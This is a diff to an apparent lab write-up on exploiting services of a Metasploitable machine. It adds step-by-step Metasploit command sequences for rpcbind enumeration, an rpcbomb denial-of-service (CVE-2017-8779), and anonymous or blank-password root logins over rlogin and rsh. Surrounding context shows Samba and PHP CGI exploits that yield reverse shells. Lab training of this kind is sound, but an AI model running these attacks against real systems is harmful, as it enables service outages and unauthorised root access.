@@ -446,10 +446,10 @@ To exploit this vulnerability, we need to craft a malicious Tkey(Transition key)
 The TKEY record (type="TKEY") is used for transaction key management in DNSSEC. BIND 9.4.2 incorrectly handles certain TKEY requests, allowing an attacker to craft a request that crashes the service.
 This exploit does not require authentication, making it a remote exploit for denial of service.
 For this I crafted a python script to send a malicious Tkey request
-[]
 ```
 python script.py
 ```
+
 --- 
 
 ## Exploiting Service on Port 80: Apache httpd 2.2.8 service
@@ -494,7 +494,51 @@ msf exploit(multi/http/php_cgi_arg_injection) > exploit
 After executing the exploit we get a meterpreter session establised with the target using reverse_tcp. Now we can execute any command remotely on the target metasploitable machine.
 
 ---
+
+## Exploiting Service on Port 111: rpcbind service
+![](../images/service_on_port_111.png)
+**rpcbind** acts as a directory service for RPC programs, allowing clients to locate specific RPC services on a server.
+When an RPC service starts on a system, it registers itself with rpcbind, informing it of the service’s program number and assigned port.
+When a client needs to communicate with a specific RPC service, it queries rpcbind on port 111 to obtain the port number associated with that service, allowing for dynamic communication with various services over the network.
+
+The rpcbind service is responsible for mapping Remote Procedure Call (RPC) services to the ports they listen on. Originally known as portmapper(its main running service), rpcbind is a crucial service in Unix and Linux environments for enabling RPC-based communication between networked systems.
+
+rpcbind is a critical part of NFS(Network file system),NIS(Network information service) where it is used to coordinate communication between NFS clients and servers. NFS relies on several RPC services (such as mountd, nfsd, and statd), all of which register their ports with rpcbind.
+
+### Identifying Vulnerabilites or Weakness
+**1. Service Enumeration and Information Disclosure**:rpcbind enables attackers to enumerate all active RPC services on a host, which can reveal details like service names, program numbers, and port numbers. This information is useful for attackers performing reconnaissance to identify potential weak points on the system.
+**2. Exploitable RPC Services**: rpcbind itself may not be directly vulnerable to exploitation, but the RPC services registered with rpcbind can have significant vulnerabilities like **rpc.mountd service** which can gain unauthorised access to the file shares to the attacker from which he can perform more complex attack like deploying its own public key to the authorized key directory of the target and gain a remote access using ssh.
+**3. 'CVE-2017-8779' Dos attack using rpcbomb packet** The rpcbomb module exploits vulnerabilities in the RPC (Remote Procedure Call) system by flooding the rpcbind service with excessive requests, which can exhaust system resources and potentially render the service unavailable.
+
+### Exploitation
+#### Exploiting Service Enumeration and Information Disclosure vulnerability: 
+The vulnerability allows the attacker to list/enumerate the various rpc service running on the target along with the port number, which can be used by the attacker to find vulnerabilities in the running rpc services.
+```
+#for this we are using rpcinfo command with -p probe to list the running rpc services on the target
+rpcinfo -p 192.168.1.103
+```
+**Output** ![](../images/rpcbind_enumeration.png)
+we can also used the rpcinfo module of the metasploitable framework to enumerate this service.
+#### Exploiting rpc.mountd service
+From the enumeration we got the nfs service is running on port 2049 which provide the root '/' filesystem share can be mounted, and we can mount in the later section on port 2049 exploitation.
+
+#### Exploiting 'CVE-2017-8779' Dos attack using rpcbomb packet
+Here we got a metasploitable module which can send enumerous rpc requeste to the rpcbind services which can exhaust system resources and potentially render the service unavailable.
+```
+msfconsole -q
+msf > search rpcbomb
+msf > use auxiliary/dos/rpc/rpcbomb
+msf auxiliay(dos/rpc/rpcbomb) > options
+msf auxiliay(dos/rpc/rpcbomb) > set RHOSTS 192.168.1.103
+msf auxiliay(dos/rpc/rpcbomb) > show options
+msf auxiliay(dos/rpc/rpcbomb) > run
+```
+**Output** ![](../images/rpcbind_Dos_attack_using_rpcbomb.png)
+![](../images/rpcbind_down_using_Dos_attack.png)
+
+---
 ## Exploiting Service on Port 139, 445: netbios-ssn Samba smbd 3.x-4.x
+![](../images/service_running_on_port_139_and_445.png)
 **SMB(Server Message Block)** is a client/server protocol that is used for sharing access to files, printers, data and other resources on a network.
 
 Microsoft introduce netbios-ssn(Network basic input output system- session services) services using SMB protocol that run on Netbios sessions service and locate as well as identify each other devices using netbios name over tcp port 139 or 445 and Is used to share files, data and devices like printer over a LAN network mainly designed for windows-based network.
@@ -519,7 +563,7 @@ msf auxiliary(scanner/smb/smb_version) > show options
 msf auxiliary(scanner/smb/smb_version) > run
 ```
 **Output**
-![]
+![](../images/smb_version_detection.png)
 From this module output we conclude that target is running samba 3.0.20 and now we have to search for any exploit available for this version of samba
 ### Exploitation
 ```
@@ -535,11 +579,14 @@ msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.1.103
 msf exploit(multi/samba/usermap_script) > run
 ```
 **Output**
-[]
+![](../images/exploiting_samba_service_1.png)
+![](../images/exploiting_samba_service_2.png)
+![](../images/exploiting_samba_service_3.png)
 After executing the exploit we get a root user session establised with the target using reverse_tcp. Now we can execute any command remotely on the target metasploitable machine.
 
 ---
 ## Exploiting Service on Port 512,513,514: r-services
+![](../images/service_running_on_port_512,513,514.png)
 The services running on ports 512, 513, and 514 on our Metasploitable machine are collectively known as "r-services," which include rexec, rlogin, and rshell. These services were popular in Unix-like systems for remote access and command execution but are generally considered insecure and outdated today due to their reliance on unencrypted communication and are mainly replaced by more secure protocol like ssh which uses encrypted communication.
 **1. rexec** The rexec (remote execution) service allows a user to execute commands on a remote machine. Authentication is done through the user's credentials (username and password) sent in plain text over the network.
 **2. rlogin**  The rlogin (remote login) service is used for logging into a remote machine from a local system. It provides a simple remote login interface and allows for command execution on the remote host. Unlike SSH, rlogin does not encrypt data, so any information, including login credentials, is sent as plaintext.
@@ -565,5 +612,28 @@ msf auxiliay(scanner/rservices/rlogin_login) > set STOP_ON_SUCCESS true
 msf auxiliay(scanner/rservices/rlogin_login) > show options
 msf auxiliay(scanner/rservices/rlogin_login) > run
 ```
+**Output**![](../images/exploiting_rlogin_services_1.png)
+![](../images/exploiting_rlogin_services_2.png)
+![](../images/exploiting_rlogin_services_3.png)
+Here we got a root shell to the rshell services using anonymous login vulnerability.
 **for rshell** we had a module on the metasploit that can be used to connect to rshell service running on the target.
 ```
+msfconsole -q
+msf > search rsh_login
+msf > use auxiliary/scanner/rservices/rshlogin
+msf auxiliay(scanner/rservices/rsh_login) > options
+msf auxiliay(scanner/rservices/rsh_login) > set ANONYMOUS_LOGIN true
+msf auxiliay(scanner/rservices/rsh_login) > set BLANK_PASSWORD true
+msf auxiliay(scanner/rservices/rsh_login) > set RHOSTS 192.168.1.103
+msf auxiliay(scanner/rservices/rsh_login) > set USERNAME root
+msf auxiliay(scanner/rservices/rsh_login) > set STOP_ON_SUCCESS true
+msf auxiliay(scanner/rservices/rsh_login) > show options
+msf auxiliay(scanner/rservices/rsh_login) > run
+```
+**Output**
+![](../images/exploiting_rshell_services_1)
+![](../images/exploiting_rshell_services_2)
+![](../images/exploiting_rshell_services_3)
+Here we got a root shell to the rshell services using anonymous login vulnerability.
+
+---
